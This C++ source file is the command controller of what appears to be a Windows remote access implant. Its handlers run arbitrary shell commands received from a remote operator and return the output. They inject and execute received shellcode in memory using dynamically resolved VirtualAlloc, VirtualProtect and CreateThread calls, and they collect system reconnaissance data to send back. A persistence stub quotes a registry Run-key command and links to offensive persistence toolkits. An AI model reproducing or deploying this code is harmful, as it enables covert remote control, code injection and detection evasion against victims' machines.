#include "Controller.h"
#include "utils.h"
#include "Recon.h"

#include <iostream> // TODO: delete later?
#include <sstream>


#include <cstdlib> // NOTE: needed to execute shell cmd


Controller::Controller(
    MessageHandler* messageHandler, 
    ApiManager* apiManager)
    :
    messageHandler_(messageHandler),
    apiManager_(apiManager)
{
}

void Controller::handleDefault(const InternalMessage& msg)
{
	std::cout << "Controller::handleDefault()" << std::endl;
}

void Controller::handleNone(const InternalMessage& msg)
{
	std::cout << "Controller::handleNone()" << std::endl;
}

void Controller::handleExecuteCommand(const InternalMessage& msg)
{
	std::cout << "Controller::handleExecuteCommand()" << std::endl;

	// std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;


	// TODO: instead add result into the queue, and have transporter send them all when ready?
	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
	//		 then skip the queue and send the message immediately 

	std::string command = byte2string(msg.data_).c_str();
	std::string result;

	// EASIEST METHOD - just use _popen directly
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe)
	{
		result = "ERROR: Failed to execute command";
	}
	else
	{
		char buffer[128];
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			result += buffer;
		}
		_pclose(pipe);
	}

	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID

	InternalMessage outMsg;
	outMsg.data_ = string2byte(result);

	MessageHeader header;
	header.messageType_ = MessageType::COMMAND_RESULT;
	header.messageId_ = 105; // TODO: use input messageId?
	header.dataSize_ = outMsg.data_.size();
	outMsg.header_ = header;

	messageHandler_->sendMessage(outMsg);
}

// TODO: figure out why this crashes the program
void Controller::handleExecuteShellcode(const InternalMessage& msg)
{
	std::cout << "Controller::handleExecuteShellcode()" << std::endl;
    
    typedef LPVOID(WINAPI* FuncVirtualAlloc)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)apiManager_->fProcedures_["VirtualAlloc"];


	//LPVOID shellMem = VirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPVOID shellMem = pVirtualAlloc(0, msg.header_.dataSize_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!shellMem) // TODO: checking if it is NULL would be more correct?
	{
		std::cout << "VirtualAlloc failed" << std::endl;
		// DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
        return;
	}

	// memcpy(beacon_mem, shellcode, bytes_received);
	// TODO: copy 8 bytes at a time, and then copy left over
	for (unsigned int i = 0; i < msg.header_.dataSize_; ++i)
	{
		((char*)shellMem)[i] = msg.data_[i];
	}

    typedef BOOL(WINAPI* FuncVirtualProtect)
    (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)apiManager_->fProcedures_["VirtualProtect"];

	// EXECUTE_READ.
	DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
	// NOTE: virtualProtect is also being called somewhere in the windows api
	if (pVirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
	//if (VirtualProtect(shellMem, msg.header_.dataSize_, PAGE_EXECUTE_READ, &old_prot) == FALSE)
	{
		std::cout << "VirtualProtect failed" << std::endl;
		// Fail silently if we cannot make the memory executable.
        return;
	}

	// DEBUG_PRINT("6 - Memory allocated and copied");

    typedef HANDLE(WINAPI* FuncCreateThread)
	(LPSECURITY_ATTRIBUTES lpThreadAttributes, 
     SIZE_T dwStackSize,
     LPTHREAD_START_ROUTINE lpStartAddress, 
     LPVOID lpParameter, 
     DWORD dwCreationFlags, 
     LPDWORD lpThreadId);

    FuncCreateThread pCreateThread = (FuncCreateThread)apiManager_->fProcedures_["CreateThread"];

	// 4.
	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	//HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
	if (!thread)
	{
		std::cout << "CreateThread failed" << std::endl;
		// DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
        return;
	}

    typedef DWORD(WINAPI* FuncWaitForSingleObject)
	(HANDLE hHandle, DWORD dwMilliseconds);

    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)apiManager_->fProcedures_["WaitForSingleObject"];

	// DEBUG_PRINT("7 - Thread created, waiting..."); 
	pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
	//WaitForSingleObject(thread, INFINITE); // Wait for thread to complete

    // TODO: virtual free?

}

void Controller::handleSystemInfo(const InternalMessage& msg)
{
	std::cout << "Controller::handleSystemInfo()" << std::endl;
    ReconMessage rMsg{};
    //ZeroMemory(msg, sizeof(ReconMessage));

    // OS Version Info
    //OSVERSIONINFOEX osInfo;
    //osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    //if (GetVersionEx((OSVERSIONINFO*)&osInfo))
    //{
        //rMsg.dwMajorVersion = osInfo.dwMajorVersion;
        //rMsg.dwMinorVersion = osInfo.dwMinorVersion;
        //rMsg.dwBuildNumber = osInfo.dwBuildNumber;
        //rMsg.wProductType = osInfo.wProductType;
    //}
    ///
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    //HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    HMODULE hMod = apiManager_->hModules_[L"ntdll.dll"];
    if (hMod)
    {
        // TODO: use apiManager for this
        //RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)apiManager_->fProcedures_["RtlGetVersion"];
        if (fxPtr != nullptr)
        {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (fxPtr(&rovi) == 0)
            {
                rMsg.dwMajorVersion = rovi.dwMajorVersion;
                rMsg.dwMinorVersion = rovi.dwMinorVersion;
                rMsg.dwBuildNumber = rovi.dwBuildNumber;
            }
        }
    }

    ///


    // RAM Info
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus))
    {
        rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys;
        rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys;
    }

    // Processor Info
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors;
    rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;

    // Get processor name from registry (simplified)
    //GetProcessorName(msg->processorName, sizeof(msg->processorName));

    // Local IP
    //GetLocalIpAddress(msg->localIp, sizeof(msg->localIp));

    // System Names
    // DWORD size = sizeof(msg->computerName);
    // GetComputerNameA(msg->computerName, &size);

    //size = sizeof(msg->userName);
    // GetUserNameA(msg->userName, &size);

    // Domain name (simplified)
    // GetDomainName(msg->domainName, sizeof(msg->domainName));

    // Process name
    // GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName));



    std::ostringstream result;
    result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
    result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n";
    result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n";
    result << "wProductType: " << rMsg.wProductType << "\n";
    result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n";
    result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n";
    result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n";
    result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";

    std::string outMsgData = result.str();

    InternalMessage outMsg;
    outMsg.data_ = string2byte(outMsgData);

    MessageHeader header;
    header.messageType_ = MessageType::COMMAND_RESULT;
    header.messageId_ = 99; // TODO:
    header.dataSize_ = outMsg.data_.size();
    outMsg.header_ = header;

	messageHandler_->sendMessage(outMsg);

}

void Controller::handleEstablishPersistence(const InternalMessage& msg)
{
    // 	RegCreateKey, RegSetValue, RegOpenKey, RegDeleteKey, RegCloseKey
    // 	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
    // https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/wizard_spider/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp

    // taskschd.msc, schtasks, /sc

    // group policy scripts?

    // https://github.com/vxunderground/VX-API/blob/main/VX-API/MpfComModifyShortcutTarget.cpp

    // https://github.com/zer0yu/Awesome-CobaltStrike

    // NOTE: https://bneg.io/2017/05/22/athena-the-cias-rat-vs-empire/

    // https://github.com/Ne0nd0g/merlin/tree/main/data/modules/windows/x64/powershell/persistence

    // https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/ATT%26CK-Stuff/ATT%26CK/Persistence.md

    // https://attack.mitre.org/tactics/TA0003/

    // https://github.com/mandiant/SharPersist?tab=readme-ov-file

    // https://github.com/samratashok/nishang?tab=readme-ov-file

    // https://github.com/infosecn1nja/Red-Teaming-Toolkit?tab=readme-ov-file#persistence

    // https://github.com/Karneades/awesome-malware-persistence

}

